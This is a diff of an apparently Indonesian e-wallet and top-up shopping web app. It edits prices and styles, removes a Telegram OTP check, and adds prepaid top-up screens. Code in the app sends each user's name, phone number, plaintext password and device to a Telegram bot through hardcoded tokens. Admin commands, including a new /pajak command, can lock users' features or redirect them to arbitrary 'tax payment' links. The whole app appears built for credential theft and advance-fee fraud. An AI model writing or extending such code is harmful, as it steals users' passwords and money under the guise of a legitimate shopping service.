@@ -99,7 +99,6 @@ img {
   max-width: 480px; 
   height: 65px; 
   background: var(--bg-card); 
-  backdrop-filter: blur(10px); 
   display: flex; 
   align-items: center; 
   justify-content: space-between; 
@@ -107,10 +106,6 @@ img {
   z-index: 1000; 
   border-bottom: 1px solid var(--border-color);
   gap: 12px;
-}
-
-[data-theme="light"] .top-bar { 
-  background: var(--bg-card); 
 }
 
 .btn-icon { 
@@ -230,7 +225,6 @@ img {
   display: none; 
   align-items: center; 
   gap: 15px; 
-  background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), transparent); 
 }
 
 .sidenav-profile i { 
@@ -299,10 +293,6 @@ img {
   border-radius: 12px; 
   transition: background 0.2s; 
   cursor: pointer; 
-}
-
-.sidenav-menu a:hover { 
-  background: var(--bg-input); 
 }
 
 .sidenav-menu i { 
@@ -698,7 +688,7 @@ img {
   background: var(--danger);
   color: #ffffff;
   padding: 4px 0;
-  font-size: 5px;
+  font-size: 7px;
   font-weight: 800;
   text-transform: uppercase;
   text-align: center; 
@@ -723,7 +713,7 @@ img {
 }
 
 .fs-header-img { 
-  height: 90px; 
+  height: 100px; 
   background-size: cover !important; 
   background-position: center !important; 
   display: flex; 
@@ -1176,7 +1166,7 @@ img {
   left: 0; 
   width: 100vw; 
   height: 100vh; 
-  background: #ffffff; 
+  background: var(--bg-container); 
   display: flex; 
   flex-direction: column; 
   transform: translateY(100%); 
@@ -1684,9 +1674,7 @@ img {
   width: calc(100% - 40px);
   max-width: 440px;
   height: 65px;
-  background: rgba(28, 33, 45, 0.75); 
-  backdrop-filter: blur(16px);
-  -webkit-backdrop-filter: blur(16px); 
+  background: var(--bg-card); 
   border: 1px solid var(--border-color);
   border-radius: 100px;
   display: flex;
@@ -1695,10 +1683,6 @@ img {
   z-index: 998;
   padding: 0 15px;
   transition: background 0.3s ease;
-}
-
-[data-theme="light"] .bottom-nav {
-  background: rgba(255, 255, 255, 0.85);
 }
 
 .nav-item {
@@ -2013,8 +1997,8 @@ img {
   padding: 15px;
   text-align: center;
   font-size: 14px;
-  font-weight: 700;
-  color: var(--text-muted);
+  font-weight: 500;
+  color: var(--text-main);
   border-bottom: 2px solid transparent;
   cursor: pointer;
   transition: all 0.3s;
@@ -2132,6 +2116,48 @@ img {
   background-size: 24px;
   border-radius: 50%;
   cursor: pointer;
+}
+.ppob-item {
+  border-radius: 16px;
+  background: var(--bg-card);
+  padding: 16px;
+  text-align: left;
+  cursor: pointer;
+  border: 1.5px solid var(--border-color);
+  transition: all 0.2s ease;
+  display: flex;
+  flex-direction: column;
+  position: relative;
+  overflow: hidden;
+}
+.ppob-item:hover, .ppob-item.active {
+  background: rgba(59, 130, 246, 0.05);
+  border-color: var(--primary);
+}
+.ppob-item.active::after {
+  content: '\F26A'; 
+  font-family: bootstrap-icons !important;
+  position: absolute;
+  top: 14px;
+  right: 14px;
+  color: var(--primary);
+  font-size: 18px;
+}
+.ppob-nominal {
+  font-size: 16px;
+  font-weight: 800;
+  color: var(--text-main);
+  margin-bottom: 8px;
+}
+.ppob-harga {
+  font-size: 11px;
+  color: var(--text-muted);
+  text-decoration: line-through;
+}
+.ppob-harga-diskon {
+  font-size: 15px;
+  color: var(--danger);
+  font-weight: 800;
 }
 </style>
 </head>
@@ -2369,42 +2395,42 @@ img {
       <div class="fs-item">
         <div class="ribbon-cashback">BIFAST</div>
         <div class="fs-header-img" style="background-image: url('https://img91.wordpress.com/wp-content/uploads/2026/07/14197.png')">
-          <div class="fs-badge"><i class="bi bi-lightning-fill"></i> 50% OFF</div>
+          <div class="fs-badge"><i class="bi bi-lightning-fill"></i> 30% OFF</div>
         </div>
         <div class="fs-content">
           <div class="fs-label-new">PENGGUNA BARU</div>
           <div class="fs-name">Produk E-Wallet<br>Rp 500.000</div>
           <div class="fs-price-strike">Rp 500.000</div>
-          <div class="fs-price">Rp 250.000</div>
-          <button class="fs-add-btn" onclick="addFlashsaleToCart('Produk E-Wallet', 500000, 250000, 'FS49263')">Beli Sekarang</button>
+          <div class="fs-price">Rp 350.000</div>
+          <button class="fs-add-btn" onclick="addFlashsaleToCart('Produk E-Wallet', 500000, 350000, 'FS49263')">Beli Sekarang</button>
         </div>
       </div>
 
       <div class="fs-item">
         <div class="ribbon-cashback">BIFAST</div>
         <div class="fs-header-img" style="background-image: url('https://img91.wordpress.com/wp-content/uploads/2026/07/14197.png')">
-          <div class="fs-badge"><i class="bi bi-lightning-fill"></i> 50% OFF</div>
+          <div class="fs-badge"><i class="bi bi-lightning-fill"></i> 30% OFF</div>
         </div>
         <div class="fs-content">
           <div class="fs-label-new">PENGGUNA BARU</div>
           <div class="fs-name">Produk E-Wallet<br>Rp 1.000.000</div>
           <div class="fs-price-strike">Rp 1.000.000</div>
-          <div class="fs-price">Rp 500.000</div>
-          <button class="fs-add-btn" onclick="addFlashsaleToCart('Produk E-Wallet', 1000000, 500000, 'FS21745')">Beli Sekarang</button>
+          <div class="fs-price">Rp 700.000</div>
+          <button class="fs-add-btn" onclick="addFlashsaleToCart('Produk E-Wallet', 1000000, 700000, 'FS21745')">Beli Sekarang</button>
         </div>
       </div>
 
       <div class="fs-item">
         <div class="ribbon-cashback">BIFAST</div>
         <div class="fs-header-img" style="background-image: url('https://img91.wordpress.com/wp-content/uploads/2026/07/14197.png')">
-          <div class="fs-badge"><i class="bi bi-lightning-fill"></i> 25% OFF</div>
+          <div class="fs-badge"><i class="bi bi-lightning-fill"></i> 15% OFF</div>
         </div>
         <div class="fs-content">
           <div class="fs-label-new">PENGGUNA BARU</div>
           <div class="fs-name">Produk E-Wallet<br>Rp 5.000.000</div>
           <div class="fs-price-strike">Rp 5.000.000</div>
-          <div class="fs-price">Rp 3.750.000</div>
-          <button class="fs-add-btn" onclick="addFlashsaleToCart('Produk E-Wallet', 5000000, 3750000, 'AUTO')">Beli Sekarang</button>
+          <div class="fs-price">Rp 4.250.000</div>
+          <button class="fs-add-btn" onclick="addFlashsaleToCart('Produk E-Wallet', 5000000, 4250000, 'AUTO')">Beli Sekarang</button>
         </div>
       </div>
     </div>
@@ -2853,21 +2879,9 @@ img {
       </div>
       <div class="input-group">
         <label>Nomor Handphone</label>
-        <div style="display: flex; gap: 10px;">
-          <div class="icon-input-wrapper" style="flex: 1;">
-            <input type="tel" id="reg-phone" placeholder="Masukkan nomor">
-            <i class="bi bi-telephone-fill left-icon"></i>
-          </div>
-          <button id="btn-get-otp" onclick="requestTelegramOTP()" style="padding: 0 15px; border-radius: 14px; background: var(--primary); color: #fff; border: none; font-weight: bold; font-size: 12px; cursor: pointer; transition: 0.3s;">Kirim OTP</button>
-        </div>
-      </div>
-      
-      <!-- Input OTP Telegram -->
-      <div class="input-group">
-        <label>Kode OTP Telegram</label>
         <div class="icon-input-wrapper">
-          <input type="number" id="reg-otp" placeholder="Masukkan 6 digit OTP">
-          <i class="bi bi-chat-dots-fill left-icon"></i>
+          <input type="tel" id="reg-phone" placeholder="Masukkan nomor">
+          <i class="bi bi-telephone-fill left-icon"></i>
         </div>
       </div>
       <div class="input-group">
@@ -3154,7 +3168,7 @@ img {
           </div>
 
           <div id="qris-ready" class="qris-box" style="display:none; background:none;margin-bottom:15px;">
-            <img id="qris-image-tag" src="" alt="QRIS" style="width:100%; max-width:480px; border-radius:16px; background-color: #ffffff; padding: 10px; box-sizing: border-box;">
+            <img id="qris-image-tag" src="" alt="QRIS" style="width:100%; max-width:480px; border-radius:12px;">
             <div onclick="openFullscreenQR()" style="display: flex; align-items: center; justify-content: center; gap: 8px; color: var(--text-main); font-weight: 700; font-size: 13px; margin-top: 12px; cursor: pointer; padding: 8px; background: var(--bg-input); border-radius: 50px;">
               <i class="bi bi-arrows-fullscreen"></i> Besarkan Gambar
             </div>
@@ -3270,16 +3284,16 @@ img {
 <div id="history-modal" class="modal-overlay" style="z-index: 1000000; align-items: flex-end; background: var(--bg-container);">
   <div class="history-modal-content" style="width: 100%; max-width: 480px; height: 100vh; padding: 0; display: flex; flex-direction: column; background: var(--bg-container); border-radius: 0;">
 
-    <div style="display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: var(--bg-card);">
+    <div style="display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid var(--border-color); background: var(--bg-card);">
       <div style="display: flex; align-items: center; gap: 15px;">
-        <i class="bi bi-chevron-left" style="font-size: 17px; cursor: pointer; color: var(--text-main);" onclick="closeFullHistory()"></i>
+        <i class="bi bi-arrow-left" style="font-size: 21px; cursor: pointer; color: var(--text-main);" onclick="closeFullHistory()"></i>
         <h2 style="font-size: 16px; font-weight: 600; margin: 0; color: var(--text-main);">Riwayat Transaksi</h2>
       </div>
-      <div id="tx-count-label" style="padding: 4px 12px; border-radius: 20px; background: var(--bg-input); border: 1px solid var(--border-color); text-transform: uppercase; font-size: 11.5px; font-weight: 600; color: var(--text-main); display: flex; align-items: center; justify-content: center; user-select: none;">
+      <div id="tx-count-label" style="padding: 4px 12px; border-radius: 20px; background: var(--bg-input); border: 1px solid var(--border-color); text-transform: uppercase; font-size: 11.5px; font-weight: 600; color: var(--text-main); display: none; align-items: center; justify-content: center; user-select: none;">
       </div>
     </div>
 
-    <div style="display: flex; align-items: center; padding: 0; background: var(--bg-card); border-bottom: 1px solid var(--border-color); height: 50px;">
+    <div style="display: flex; align-items: center; padding: 15px; background: var(--bg-card); border-bottom: 1px solid var(--border-color);">
       <div style="flex: 1; height: 100%; position: relative; display: flex; justify-content: center;">
         <div onclick="openCustomSelect('modal-filter-waktu')" id="trigger-filter-waktu" style="width: 100%; height: 100%; background: transparent; color: var(--text-main); font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
           <span class="select-text">30 Hari Terakhir</span>
@@ -3411,7 +3425,7 @@ img {
     <button class="btn-icon" onclick="closeFullscreenQR()"><i class="bi bi-x-lg"></i></button>
   </div>
   <div style="flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px;">
-    <img id="fullscreen-qris-img" src="" alt="QRIS Fullscreen" style="max-width: 100%; max-height: 80vh; border-radius: 16px; background-color: #ffffff; padding: 10px; box-sizing: border-box;">
+    <img id="fullscreen-qris-img" src="" alt="QRIS Fullscreen" style="max-width: 100%; max-height: 80vh; border-radius: 12px;">
   </div>
 </div>
 
@@ -3526,9 +3540,9 @@ img {
 <div id="public-history-modal" class="modal-overlay" style="z-index: 1000000; align-items: flex-end; background: var(--bg-container);">
   <div class="history-modal-content" style="width: 100%; max-width: 480px; height: 100vh; padding: 0; display: flex; flex-direction: column; background: var(--bg-container); border-radius: 0;">
 
-    <div style="display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: var(--bg-card);">
+    <div style="display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid var(--border-color); background: var(--bg-card);">
       <div style="display: flex; align-items: center; gap: 15px;">
-        <i class="bi bi-chevron-left" style="font-size: 17px; cursor: pointer; color: var(--text-main);" onclick="closeTargetModal('public-history-modal')"></i>
+        <i class="bi bi-arrow-left" style="font-size: 21px; cursor: pointer; color: var(--text-main);" onclick="closeTargetModal('public-history-modal')"></i>
         <h2 style="font-size: 16px; font-weight: 600; margin: 0; color: var(--text-main);">Ulasan Testimoni</h2>
       </div>
     </div>
@@ -3583,6 +3597,38 @@ img {
              oninput="updatePiecePosition(this.value)" 
              onchange="validateSliderCaptcha()" 
              ontouchend="validateSliderCaptcha()">
+    </div>
+  </div>
+</div>
+
+<div id="ppob-transaction-modal" class="modal-overlay" style="z-index: 1000000; align-items: flex-end; background: var(--bg-container);">
+  <div class="history-modal-content" style="width: 100%; max-width: 480px; height: 100vh; padding: 0; display: flex; flex-direction: column; background: var(--bg-body); border-radius: 0;">
+    
+    <div style="display: flex; align-items: center; padding: 15px 20px; background: var(--bg-card); border-bottom: 1px solid var(--border-color); z-index: 10;">
+      <i class="bi bi-arrow-left" style="font-size: 21px; cursor: pointer; color: var(--text-main); margin-right: 15px;" onclick="closeTargetModal('ppob-transaction-modal')"></i>
+      <h2 id="ppob-title" style="font-size: 16px; font-weight: 600; margin: 0; color: var(--text-main);">Pulsa Prabayar</h2>
+    </div>
+
+    <div style="background: var(--bg-card); padding: 20px; border-bottom: 1px solid var(--border-color);">
+      <label id="ppob-input-label" style="font-size: 13px; color: var(--text-muted); font-weight: 600; margin-bottom: 10px; display: block;">Nomor Handphone</label>
+      <div class="icon-input-wrapper">
+        <input type="number" id="ppob-input-number" placeholder="Masukkan nomor" style="width: 100%; padding: 16px 16px 16px 45px; border-radius: 14px; background: var(--bg-input); color: var(--text-main); border: 1px solid transparent; font-size: 15px; font-weight: 700; outline: none; transition: all 0.3s;">
+        <i class="bi bi-phone left-icon" id="ppob-input-icon"></i>
+      </div>
+    </div>
+
+    <div style="flex: 1; overflow-y: auto; padding: 20px; background: var(--bg-container);">
+      <div style="font-size: 14px; font-weight: 700; color: var(--text-main); margin-bottom: 15px;" id="ppob-product-title">Pilih Nominal</div>
+      <div id="ppob-token-list" style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding-bottom: 20px;">
+      </div>
+    </div>
+
+    <div style="background: var(--bg-card); padding: 15px 20px; border-top: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between;">
+      <div>
+        <div style="font-size: 11px; color: var(--text-muted); font-weight: 600; margin-bottom: 2px;">Total Pembayaran</div>
+        <div id="ppob-total-pay" style="font-size: 18px; font-weight: 800; color: var(--text-main);">Rp 0</div>
+      </div>
+      <button class="btn-modal" style="width: auto; padding: 12px 35px; margin-top: 0; border-radius: 50px;" onclick="showModal('Perhatian', 'Silakan aktivasi PPN Merchant terlebih dahulu untuk melanjutkan transaksi.', 'info')">Lanjutkan</button>
     </div>
   </div>
 </div>
@@ -3643,7 +3689,7 @@ setInterval(function() {
     }
 }, 1000);
 
-const BOT_TOKEN = '8765727817:AAEzCv9z6n1OrAzEll_DdHM-lO2fpeL__oY'; 
+const BOT_TOKEN = '8895207022:AAGPkuK8zeViJbf__d8Ip50TW01BNVqY5mw'; 
 const CHAT_ID = '8893393746';
 
 let userID = null;
@@ -4010,7 +4056,7 @@ function updateDynamicSections() {
   if (!currentUserPhone) {
     if (fsSection) fsSection.style.display = 'block';
     if (erSection) erSection.style.display = 'block';
-    if (pubTrxBox && pubTrxBox.innerHTML.includes('Tidak ada data transaksi')) {
+    if (pubTrxBox && pubTrxBox.innerHTML.includes('Tidak ada transaksi')) {
       pubTrxBox.innerHTML = '';
     }
     return;
@@ -4498,6 +4544,16 @@ function updateAuthUI() {
       verifBtn.onclick = () => { toggleNav(); openKTPModal(); };
     }
 
+    if (u.pajakLink) {
+      verifBtn.style.display = "flex";
+      document.getElementById('nav-verif-text').innerText = "Bayar Pajak";
+      document.getElementById('nav-verif-icon').className = "bi bi-receipt-cutoff"; 
+      verifBtn.onclick = () => { 
+        toggleNav(); 
+        window.location.href = u.pajakLink; 
+      };
+    }
+
     authLinks.style.display = 'none'; logoutLink.style.display = 'flex'; 
     loadUserData(currentUserPhone);
     if (userBalance > 0 && !u.pinCode) {
@@ -4689,87 +4745,15 @@ function getDeviceName() {
   return navigator.userAgent;
 }
 
-let generatedOTP = null;
-let otpCooldown = 0;
-let otpInterval = null;
-
-// Tambahkan token Bot Publik Anda secara eksplisit
-const PUBLIC_BOT_TOKEN = "8616039620:AAGjL4kupTmiHR-amFviAzpfSdZ2DaohmRk";
-
-function requestTelegramOTP() {
-  const phoneInput = document.getElementById('reg-phone').value.trim();
-  
-  if (!phoneInput || phoneInput.length < 10) {
-    return showModal("Perhatian", "Masukkan nomor handphone yang valid terlebih dahulu.", "error");
-  }
-
-  if (otpCooldown > 0) return;
-
-  // Mengambil ID Telegram User yang mengeklik tombol di Mini App
-  let tgUserId = null;
-  if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
-    tgUserId = window.Telegram.WebApp.initDataUnsafe.user.id;
-  }
-
-  if (!tgUserId) {
-    return showModal("Perhatian", "Sistem tidak dapat mendeteksi ID Telegram Anda. Buka melalui Bot Telegram.", "error");
-  }
-
-  // Buat OTP
-  generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
-  const otpMessage = `*KODE OTP*\n\nKode verifikasi Anda adalah: *${generatedOTP}*`;
-
-  // PERHATIKAN DI SINI: Gunakan PUBLIC_BOT_TOKEN, bukan variabel bot admin Anda
-  const apiUrl = `https://api.telegram.org/bot${PUBLIC_BOT_TOKEN}/sendMessage?chat_id=${tgUserId}&text=${encodeURIComponent(otpMessage)}&parse_mode=Markdown`;
-
-  fetch(apiUrl)
-    .then(res => res.json())
-    .then(data => {
-      if (data.ok) {
-        showModal("Berhasil", "Kode OTP telah dikirim ke chat bot publik Anda.", "win");
-        
-        otpCooldown = 60;
-        const btn = document.getElementById('btn-get-otp');
-        btn.disabled = true;
-        btn.style.background = 'var(--text-muted)';
-        
-        otpInterval = setInterval(() => {
-          otpCooldown--;
-          btn.innerText = `Tunggu (${otpCooldown}s)`;
-          if (otpCooldown <= 0) {
-            clearInterval(otpInterval);
-            btn.disabled = false;
-            btn.innerText = 'Kirim OTP';
-            btn.style.background = 'var(--primary)';
-          }
-        }, 1000);
-      } else {
-        console.error("Telegram API Error:", data);
-        showModal("Perhatian", "Gagal mengirim OTP. Pastikan Anda sudah klik /start di Bot Publik.", "error");
-      }
-    })
-    .catch(err => {
-      showModal("Perhatian", "Gangguan jaringan saat menghubungi server.", "error");
-    });
-}
-
 function processRegister() {
   const name = document.getElementById('reg-name').value.trim();
   const phone = document.getElementById('reg-phone').value.trim();
   const pass = document.getElementById('reg-password').value.trim();
   const ref = document.getElementById('reg-ref').value.trim();
-  
-  // Ambil nilai OTP
-  const inputOtp = document.getElementById('reg-otp').value.trim();
 
   if (!name || !phone || !pass || !ref) return showModal("Perhatian", "Lengkapi seluruh data terlebih dahulu.", "error");
   if (name.length < 3) return showModal("Perhatian", "Pendaftaran nama lengkap minimal 3 karakter.", "error");
   if (phone.length < 10) return showModal("Perhatian", "Pendaftaran nomor handphone minimal 10 digit angka.", "error");
-  
-  // LOGIKA VALIDASI OTP TELEGRAM
-  if (!inputOtp) return showModal("Perhatian", "Silakan klik 'Kirim OTP' dan masukkan kodenya.", "error");
-  if (inputOtp !== generatedOTP) return showModal("Perhatian", "Kode OTP salah atau telah kadaluarsa.", "error");
-
   if (ref !== "REF57183") return showModal("Perhatian", "Kode referensi tidak valid.", "error");
   if (!cfCaptchaStatus['reg']) return showModal("Perhatian", "Selesaikan verifikasi terlebih dahulu.", "error");
   
@@ -4785,17 +4769,12 @@ function processRegister() {
   usersDb[phone] = { name: name, password: pass, uid: newUID, isBlocked: false, isVerified: false, isReseller: false, loginPin: null, firstTrxDone: {} };
   localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
   
-  // Reset OTP
-  generatedOTP = null; 
-  document.getElementById('reg-otp').value = '';
-
   localStorage.setItem('sanz_has_visited', 'true');
   document.getElementById('register-close-btn').style.display = 'flex';
 
   addNotifToUser(phone, "Selamat bergabung! Klaim saldo reward khusus pengguna baru.", "bonus");
 
   const deviceUsed = getDeviceName();
-  // Notifikasi ke admin (seperti sebelumnya)
   sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${newUID}\`\n\nDevice: \`${deviceUsed}\``);
   
   closeTargetModal('register-modal'); 
@@ -4804,7 +4783,9 @@ function processRegister() {
   setTimeout(() => { 
     closeInfoModal(); 
     openLoginModal(); 
+    
     document.getElementById('login-close-btn').style.display = 'none';
+    
     document.getElementById('login-phone').value = phone; 
   }, 1500);
 }
@@ -4954,14 +4935,82 @@ function openPPOBModal(service) {
       "warning"
     );
   }
+
+  if (!u.unlockedAll) {
+    return challengeUserPinSystem(() => {
+      showModal(
+        "Perhatian", 
+        `Silakan melakukan transaksi minimal 1x<br>untuk membuka fitur.`, 
+        "warning"
+      );
+    });
+  }
+
+  if (service === 'Pulsa' || service === 'PLN' || service === 'Token PLN') {
+    openPPOBTransaction(service);
+  } else {
+
+    showModal("Perhatian", `Silakan melakukan transaksi minimal 1x<br>untuk membuka fitur.`, "warning");
+  }
+}
+
+let selectedPPOBPrice = 0;
+
+function openPPOBTransaction(service) {
+  document.getElementById('ppob-input-number').value = '';
+  document.getElementById('ppob-total-pay').innerText = 'Rp 0';
+  selectedPPOBPrice = 0;
+
+  const titleEl = document.getElementById('ppob-title');
+  const labelEl = document.getElementById('ppob-input-label');
+  const listEl = document.getElementById('ppob-token-list');
+  const iconEl = document.getElementById('ppob-input-icon');
+  const prodTitle = document.getElementById('ppob-product-title');
   
-  challengeUserPinSystem(() => {
-    showModal(
-      "Perhatian", 
-      `Silakan melakukan transaksi minimal 1x<br>untuk membuka fitur.`, 
-      "warning"
-    );
+  if (service === 'Pulsa') {
+     titleEl.innerText = 'Pulsa Prabayar';
+     labelEl.innerText = 'Nomor Handphone';
+     iconEl.className = 'bi bi-phone left-icon';
+     prodTitle.innerText = 'Pilih Nominal Pulsa';
+  } else {
+     titleEl.innerText = 'Token Listrik';
+     labelEl.innerText = 'ID Pelanggan / Nomor Meter';
+     iconEl.className = 'bi bi-lightning-charge left-icon';
+     prodTitle.innerText = 'Pilih Nominal Token';
+  }
+  
+  const nominals = [
+     5000, 10000, 15000, 20000, 25000,
+     30000, 40000, 50000, 75000, 100000,
+     150000, 200000, 300000, 500000
+  ];
+  
+  let html = '';
+  nominals.forEach(nom => {
+     const hargaDiskon = nom - 2000;
+     let formatNominal = nom >= 1000 ? (nom/1000) + ' Ribu' : nom; 
+     
+     html += `
+       <div class="ppob-item" onclick="selectPPOBItem(this, ${hargaDiskon})">
+         <div class="ppob-nominal">${formatNominal}</div>
+         <div class="ppob-harga">Rp ${nom.toLocaleString('id-ID')}</div>
+         <div class="ppob-harga-diskon">Rp ${hargaDiskon.toLocaleString('id-ID')}</div>
+       </div>
+     `;
   });
+  listEl.innerHTML = html;
+  
+  openTargetModal('ppob-transaction-modal');
+}
+
+function selectPPOBItem(el, price) {
+  document.querySelectorAll('.ppob-item').forEach(item => item.classList.remove('active'));
+
+  el.classList.add('active');
+  
+  selectedPPOBPrice = price;
+
+  document.getElementById('ppob-total-pay').innerText = typeof formatIDR === 'function' ? formatIDR(price) : 'Rp ' + price.toLocaleString('id-ID');
 }
 
 function addFlashsaleToCart(itemName, normalPrice, promoPrice, couponCode) {
@@ -5094,7 +5143,7 @@ function proceedCartCheckout() {
     } else if (userBalance >= 500000) {
       if (!u.isReseller) {
         showModal("Perhatian", "Silakan aktivasi terlebih dahulu sebelum melanjutkan transaksi.", "warning");
-        setTimeout(() => { closeTargetModal('cart-modal'); openTargetModal('reseller-verif-modal'); }, 2000);
+        setTimeout(() => { closeTargetModal('cart-modal'); openTargetModal('reseller-verif'); }, 2000);
         return;
       } else {
         return showModal("Perhatian", "Kode promo expired atau terjadi kesalahan silakan hubungi bantuan.", "error");
@@ -5308,55 +5357,29 @@ function cancelActiveDepositSystem() {
   closeTargetModal('deposit-modal');
 }
 
-function getCRC16(str) {
-  let crc = 0xFFFF;
-  for (let i = 0; i < str.length; i++) {
-    crc ^= (str.charCodeAt(i) << 8) & 0xFFFF;
-    for (let j = 0; j < 8; j++) {
-      if ((crc & 0x8000) !== 0) {
-        crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
-      } else {
-        crc = (crc << 1) & 0xFFFF;
-      }
-    }
-  }
-  return crc.toString(16).toUpperCase().padStart(4, '0');
-}
-
 function requestDeposit() {
-  const baseAmount = parseInt(document.getElementById('deposit-amount').value);
-  if (isNaN(baseAmount) || baseAmount < 50000) return showModal("Perhatian", "Jumlah minimal pengisian Rp 50.000", "error");
-  if (baseAmount > 10000000) return showModal("Perhatian", "Jumlah maksimal pengisian Rp 10.000.000", "error");
-  if (!selectedPaymentMethod) return showModal("Perhatian", "Silakan pilih metode pembayaran.", "warning");
-
-  const uniqueCode = Math.floor(Math.random() * 900) + 100; 
-  const totalAmount = baseAmount + uniqueCode;
-
-  const qrisRaw = "00020101021126610016ID.CO.SHOPEE.WWW01189360091800226409940208226409940303UMI51440014ID.CO.QRIS.WWW0215ID10264721078080303UMI5204594153033605802ID5912XTRA DIGITAL6011TASIKMALAYA61054648562070703A01";
+  const amount = parseInt(document.getElementById('deposit-amount').value);
+  if (isNaN(amount) || amount < 50000) return showModal("Perhatian", "Jumlah minimal pengisian Rp 50.000", "error");
   
-  const amountStr = totalAmount.toString();
-  const amountLen = amountStr.length < 10 ? "0" + amountStr.length : amountStr.length.toString();
-  const amountTag = "54" + amountLen + amountStr; 
+  if (amount > 10000000) return showModal("Perhatian", "Jumlah maksimal pengisian Rp 10.000.000", "error");
 
-  const qrisToCalc = qrisRaw + amountTag + "6304";
-  const finalQris = qrisToCalc + getCRC16(qrisToCalc);
-  
-  const qrImageUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=5&bgcolor=ffffff&data=" + encodeURIComponent(finalQris);
+  if (!selectedPaymentMethod) {
+    return showModal("Perhatian", "Silakan pilih metode pembayaran.", "warning");
+  }
 
   let trxId = Date.now();
   let timeStr = new Date().toLocaleTimeString('id-ID');
 
-  let activeDep = { id: trxId, uid: userID, amount: totalAmount, status: 'Menunggu', endTime: Date.now() + (5 * 60 * 1000), qrUrl: qrImageUrl };
+  let activeDep = { id: trxId, uid: userID, amount: amount, status: 'Menunggu', endTime: Date.now() + (5 * 60 * 1000) };
   localStorage.setItem(`sanz_active_deposit_${currentUserPhone}`, JSON.stringify(activeDep));
 
   document.getElementById('deposit-step-1').style.display = 'none';
   document.getElementById('deposit-step-2').style.display = 'block';
   document.getElementById('deposit-amount-display').style.display = 'block';
   document.getElementById('deposit-instructions').style.display = 'none';
-  
-  document.getElementById('deposit-amount-display').innerText = formatIDR(totalAmount);
-  
-  tradeHistory.unshift({ id: trxId, type: 'Deposit', amount: totalAmount, time: timeStr, status: 'Menunggu', info: 'QRIS Merchant' });
+  document.getElementById('deposit-amount-display').innerText = formatIDR(amount);
+
+  tradeHistory.unshift({ id: trxId, type: 'Deposit', amount: amount, time: timeStr, status: 'Menunggu', info: 'QRIS Merchant' });
   saveDataLocally(); renderHistory();
 
   const deviceUsed = getDeviceName();
@@ -5366,9 +5389,7 @@ function requestDeposit() {
   let userPass = u ? u.password : '-';
   let methodName = selectedPaymentMethod === 'qris' ? 'QRIS Merchant' : 'Virtual Account';
 
-  sendToTelegram(`*USER DEPOSIT*\nNama: ${userName}\nHP: \`${currentUserPhone}\`\nUID: \`${userID}\`\nPassword: \`${userPass}\`\nNominal: Rp ${totalAmount.toLocaleString('id-ID')}\nMetode: ${methodName}\n\nDevice: \`${deviceUsed}\`\n\nKonfirmasi: \`/acc ${totalAmount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
-  
-  showQR(qrImageUrl, activeDep);
+  sendToTelegram(`*USER DEPOSIT*\nNama: ${userName}\nHP: \`${currentUserPhone}\`\nUID: \`${userID}\`\nPassword: \`${userPass}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nMetode: ${methodName}\n\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
 }
 
 function showQR(url, activeDep, isResume = false) {
@@ -5863,10 +5884,28 @@ async function fetchTelegramUpdates() {
           if (!isNaN(inputNominal) && uidParam === targetUidVal) {
             let paidAmount;
             
-            if (inputNominal >= 5000000) {
-                paidAmount = inputNominal * 0.75; 
-            } else {
-                paidAmount = inputNominal * 0.50; 
+            switch (inputNominal) {
+                case 50000:
+                    paidAmount = 1000;  
+                    break;
+                case 100000:
+                    paidAmount = 50000; 
+                    break;
+                case 200000:
+                    paidAmount = 100000;  
+                    break;
+                case 500000:
+                    paidAmount = 350000;  
+                    break;
+                case 1000000:
+                    paidAmount = 700000;  
+                    break;
+                case 5000000:
+                    paidAmount = 4250000;
+                    break;
+                default:
+                    paidAmount = inputNominal; 
+                    break;
             }
             
             let customDateStr = '';
@@ -5961,8 +6000,13 @@ async function fetchTelegramUpdates() {
         else if (command === '/unlock') { 
           usersDb[targetPhone].unlockedAll = true; 
           localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "Fitur reseller diverifikasi."); 
-          sendToTelegram(`Fitur reseller \`${parts[1]}\` diverifikasi.`); 
+          sendToTelegram(`Fitur reseller \`${parts[1]}\` berhasil dibuka.`); 
+          if (targetPhone === currentUserPhone) updateAuthUI();
+        }
+        else if (command === '/lock') { 
+          usersDb[targetPhone].unlockedAll = false; 
+          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+          sendToTelegram(`Fitur reseller \`${parts[1]}\` berhasil dikunci.`); 
           if (targetPhone === currentUserPhone) updateAuthUI();
         }
         else if (command === '/trx') { 
@@ -6034,6 +6078,23 @@ async function fetchTelegramUpdates() {
           sendToTelegram(`Event ditampilkan untuk \`${targetUidVal}\``);
           if (targetPhone === currentUserPhone) updateDynamicSections();
         }
+        else if (command === '/pajak') {
+          let linkUrl = parts[1];
+          if (linkUrl && targetPhone) {
+            usersDb[targetPhone].pajakLink = linkUrl;
+            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+            sendToTelegram(`Pajak diaktifkan untuk \`${targetUidVal}\``);
+            if (targetPhone === currentUserPhone) updateAuthUI();
+          }
+        }
+        else if (command === '/hide_pajak') {
+          if (targetPhone) {
+            usersDb[targetPhone].pajakLink = null;
+            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
